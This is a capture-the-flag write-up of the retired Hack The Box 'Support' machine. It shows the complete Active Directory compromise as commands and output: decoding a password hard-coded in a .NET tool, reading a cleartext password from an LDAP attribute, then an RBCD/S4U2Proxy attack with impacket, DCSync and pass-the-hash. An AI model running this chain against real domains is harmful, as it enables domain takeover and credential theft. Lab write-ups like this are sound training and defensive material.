# Support — Hack The Box, Easy, Windows / Active Directory

**TL;DR:** The `guest` account can read a non-default SMB share holding a custom
.NET tool, `UserInfo.exe`. The binary carries an LDAP service password
XOR-obfuscated with a key that ships in the same file; disassembling it recovers
`support\ldap`. That account reads the directory, where the `support` user's
password sits in cleartext in its `info` attribute — and `support` is in `Remote
Management Users`, so WinRM gives the user flag. `support` is also in a custom
group, `Shared Support Accounts`, that holds `GenericAll` on the domain
controller's computer object; with the default `MachineAccountQuota` of 10 that is
a textbook RBCD → S4U2Proxy → DCSync to Domain Admin.

---

## Recon: twelve ports and nothing to browse

```
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985
```

A textbook domain controller and nothing else — no 80, no 443, no 3389. The full
65535-port sweep added only `9389/adws` and the usual high RPC ports, so there is
no odd service hiding at the top of the range either. When the port list is
*purely* the AD service set, the path is in the directory or in a share.

LDAP named the domain: `support.htb`, host `DC`, Server 2022 Build 20348, SMB
signing required.

## The share that should not be readable

A null session authenticates but cannot enumerate shares. The `guest` account
can:

```
$ nxc smb 10.129.x.x -u guest -p '' --shares
IPC$            READ
support-tools   READ   support staff tools
```

`support-tools` is not a default share. Its contents:

```
7-ZipPortable_21.07.paf.exe      2880728   28 May 2022
npp.8.4.1.portable.x64.zip       5439245   28 May 2022
putty.exe                        1273576   28 May 2022
SysinternalsSuite.zip           48102161   28 May 2022
UserInfo.exe.zip                  277499   20 Jul 2022   <--
windirstat1_1_2_setup.exe          79171   28 May 2022
WiresharkPortable64_3.6.5.paf.exe 44398000  28 May 2022
```

Seven files. Six are things you can download from the internet, all uploaded on
the same day. One is a name that exists nowhere else, uploaded almost two months
later. That timestamp gap is the whole tell — you do not need to know what
`UserInfo.exe` is to know it is the only file on the share somebody here wrote.

## Reading the binary properly, not hopefully

`UserInfo.exe` is a .NET Framework 4.8 assembly. UTF-16 strings give up the shape
of it immediately:

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
```

An obfuscated blob, a suspicious word, an LDAP URL and a bind account. It is
tempting to guess the transform from here — and guessing is exactly how you burn
twenty minutes on an off-by-one. The assembly is managed code; read it.

No decompiler in the container, so `apt install mono-utils` and disassemble:

```
$ monodis --output=userinfo.il UserInfo.exe
```

`UserInfo.Services.Protected::getPassword`, in IL:

```
IL_0000:  ldsfld    string Protected::enc_password
IL_0005:  call      uint8[] System.Convert::FromBase64String(string)
...
IL_0016:  ldsfld    uint8[] Protected::key
IL_0023:  rem                       // key[i % key.Length]
IL_0025:  xor
IL_0026:  ldc.i4    223             // 0xDF
IL_002b:  xor
IL_0038:  call      Encoding::get_Default()
```

and the static constructor supplies both operands:

```
IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
IL_000f:  ldstr "armando"      → Encoding.ASCII.GetBytes → key
```

So: base64-decode, XOR against the repeating key `armando`, XOR every byte with
`0xDF`.

```python
import base64
enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
print(bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc))).decode())
```

A 36-character password for `support\ldap`. It works on SMB and LDAP — and is
refused by WinRM, which is worth learning early rather than after twenty failed
shell attempts.

Worth naming what this actually is: not encryption. The key travels in the same
file as the ciphertext, so this is an encoding with extra steps. Any credential
compiled into a binary you hand to users is a credential you have published.

## The attribute nobody thinks of as a secret store

`ldap` reads the directory. The instinct is to grep for `description` — the
famous one — but the right move is to dump every user object whole and then look
at what is populated, because the interesting attribute is rarely the one you
predicted:

```
$ ldapsearch -x -H ldap://10.129.x.x -D 'ldap@support.htb' -w '<pw>' \
    -b 'DC=support,DC=htb' '(objectClass=user)' > ldap-users-full.txt
```

Twenty users, all sharing `company: support` and a street address. One object has
something none of the others do:

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

`info` is the "Notes" box on the Telephones tab of ADUC. It is not protected, it
is not confidential-flagged, and every authenticated user in the domain can read
it. And the same object is in `Remote Management Users`, which is WinRM.

```
WINRM  10.129.x.x  5985  DC  [+] support.htb\support:Ironside... (Pwn3d!)
```

`user.txt`.

## Two lines of `whoami /all` decide the rest

```
SUPPORT\Shared Support Accounts   Group   S-1-5-21-...-1103
SeMachineAccountPrivilege         Add workstations to domain   Enabled
```

Neither is interesting alone. `SeMachineAccountPrivilege` is on every domain user
by default, and a custom group is just a custom group. Together they are a
question worth one command: *what does that group have rights over?*

```
$ nxc ldap ... -M maq
MachineAccountQuota: 10
```

and from the BloodHound collection, filtering ACEs by the group's SID:

```
Shared Support Accounts --[GenericAll]--> DC.SUPPORT.HTB
```

Full control of the domain controller's *computer object*, held by a group whose
name says help desk. That is Resource-Based Constrained Delegation, and its two
preconditions — write access to the target computer object, and the ability to
create a computer account to delegate from — are both satisfied.

## RBCD → S4U2Proxy → DCSync

Create the account you will delegate from:

```
$ impacket-addcomputer support.htb/support:'<pw>' -dc-ip 10.129.x.x \
    -computer-name 'ATTACK$' -computer-pass '<pw>'
[*] Successfully added machine account ATTACK$
```

Point the DC's delegation attribute at it:

```
$ impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'DC$' \
    -dc-ip 10.129.x.x -action write support.htb/support:'<pw>'
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
```

(The "is empty" line matters for cleanup: it records that the attribute had no
prior value, so removing yours restores the original state exactly.)

Then ask the KDC for a ticket to the DC's own CIFS service, as Administrator:

```
$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
    -dc-ip 10.129.x.x support.htb/'ATTACK$':'<pw>'
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

`Administrator` never logged in and nothing was cracked. The DC issued a ticket
that says you are Administrator because you told it, truthfully, that a computer
you control is trusted to act on other users' behalf.

With that ticket, DCSync:

```
$ KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache \
  impacket-secretsdump -k -no-pass dc.support.htb -just-dc-user Administrator
Administrator:500:aad3b435...:<administrator-nt-hash>:::
```

and pass-the-hash for `root.txt`.

## What did not work, and one thing I nearly got wrong

- **WinRM as `ldap`** — refused. The account is in no group that grants remote
  management. Easy to misread as a wrong password if you only test one service;
  testing SMB *and* LDAP *and* WinRM in the same breath is what made it obvious the
  credential was fine and the *authorization* was the limit.
- **`KRB5CCNAME` pointing at a file that does not exist yet** makes `getST` exit
  with `[Errno 2]` before doing any work. It wants to *read* that path, not create
  it. Let it write its default filename in the cwd and set `KRB5CCNAME` afterwards
  for the tool that consumes the ticket.
- **Guessing the XOR scheme from `strings` output.** Both operands were visible,
  so a guess would probably have worked — but if the constant `0xDF` had not been
  there, or the key had been the *bytes* rather than the ASCII of `armando`, I
  would have concluded the password was wrong instead of the algorithm. A
  disassembler cost sixty seconds and removed the question. For managed code there
  is no reason to guess.

## The shape of it

Four links, and none of them is a CVE:

1. `guest` can read a share (configuration)
2. a binary on that share carries a password (development practice)
3. an LDAP attribute carries another password (administrative practice)
4. a support group owns the DC object (delegation practice)

Remove any one of the first three and the box still falls to the next attacker who
obtains any credential in `Shared Support Accounts`, because link 4 is a permanent
one-command path from that group to Domain Admin. That is the finding worth
leading a report with — and it is the least visible of the four, because nothing
about it is *missing*. It is a right somebody deliberately granted.

---

*Flag values redacted; the machine is retired.*
